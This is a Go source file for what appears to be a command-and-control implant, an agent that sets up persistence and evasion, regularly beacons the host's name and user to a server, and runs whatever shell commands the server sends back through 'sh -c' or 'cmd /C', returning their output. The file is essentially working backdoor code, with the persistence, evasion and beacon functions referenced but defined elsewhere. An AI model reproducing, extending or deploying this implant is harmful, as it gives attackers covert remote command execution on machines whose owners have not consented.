package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

var (
	serverAddr = flag.String("addr", "localhost:8080", "Server address")
	AgentID    = "dev-agent-001"
	ServerAddr = "localhost:8080"
)

func parseTaskPayload(payload string) (string, error) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return "", fmt.Errorf("empty task payload")
	}
	if strings.HasPrefix(payload, "task:") {
		payload = strings.TrimPrefix(payload, "task:")
	}
	if strings.HasPrefix(payload, "exec:") {
		payload = strings.TrimPrefix(payload, "exec:")
	} else if strings.HasPrefix(payload, "cmd:") {
		payload = strings.TrimPrefix(payload, "cmd:")
	} else if strings.HasPrefix(payload, "shell:") {
		payload = strings.TrimPrefix(payload, "shell:")
	} else if strings.EqualFold(os.Getenv("NULLBEACON_ALLOW_RAW_COMMANDS"), "true") {
		return payload, nil
	}
	if strings.TrimSpace(payload) == "" {
		return "", fmt.Errorf("task contained no command")
	}
	return payload, nil
}

func executeTask(taskPayload string) ([]byte, error) {
	command, err := parseTaskPayload(taskPayload)
	if err != nil {
		return nil, err
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	return cmd.CombinedOutput()
}

func main() {
	flag.Parse()
	if *serverAddr != "localhost:8080" {
		ServerAddr = *serverAddr
	}
	persist()
	evasion()
	for {
		n := activeProfile.Interval + rand.Intn(5)
		hostname, err := os.Hostname()
		if err != nil {
			log.Printf("failed to get hostname: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}
		currentUser, err := user.Current()
		if err != nil {
			log.Printf("failed to get current user: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		response, err := beaconHTTP(ServerAddr, AgentID, currentUser.Username, hostname)
		if err != nil {
			log.Printf("failed to beacon: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		response = strings.TrimSpace(response)
		if response == "ACK" {
			log.Printf("beacon acknowledged")
		} else {
			output, err := executeTask(response)
			if err != nil {
				log.Printf("task rejected: %v", err)
				flat := strings.TrimSpace(err.Error())
				if err := sendResult(ServerAddr, AgentID, flat); err != nil {
					log.Printf("failed to send result: %v", err)
				}
				time.Sleep(time.Duration(n) * time.Second)
				continue
			}
			log.Printf("command output: %s", output)
			flat := strings.ReplaceAll(string(output), "\n", " ")
			if err := sendResult(ServerAddr, AgentID, flat); err != nil {
				log.Printf("failed to send result: %v", err)
			}
		}
		time.Sleep(time.Duration(n) * time.Second)
	}
}
